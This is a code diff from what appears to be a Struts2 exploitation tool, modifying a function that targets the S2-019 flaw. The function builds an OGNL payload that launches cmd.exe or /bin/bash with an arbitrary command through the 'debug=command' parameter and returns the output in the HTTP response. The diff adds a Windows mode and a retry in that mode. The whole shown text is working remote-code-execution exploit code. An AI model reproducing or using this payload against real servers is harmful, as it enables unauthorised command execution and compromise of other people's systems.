@@ -586,24 +586,25 @@ function doStruts2_005(url, fnCbk)
 	  );
 }
 
-function doStruts2_019(url, fnCbk)
+function doStruts2_019(url, fnCbk,bW)
 {
 	url = fnNotEnd(url);
 	// (@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))
-	var s = ('#iswin=false,#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmd + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
+	var s = ('#iswin=' + !!bW + ',#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
 		+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#wt.flush()'
 		+',#wt.close()');
 	request(fnOptHeader({method: 'GET',uri: url + "?debug=command&expression=" 
 		+ encodeURIComponent(s)
 		})
 	  , function (error, response, body){
-	  	console.log(error||body);
+	  	// console.log(error||body);
 	  		if(body)
 	  		{
 	  			fnDoBody(body.replace(/\u0000/gmi,''),"s2-019");
 	  		}
 	    }
 	  );
+	if(!bW)doStruts2_019(url,null,true);
 }
 
 function doStruts2_029(url, fnCbk)
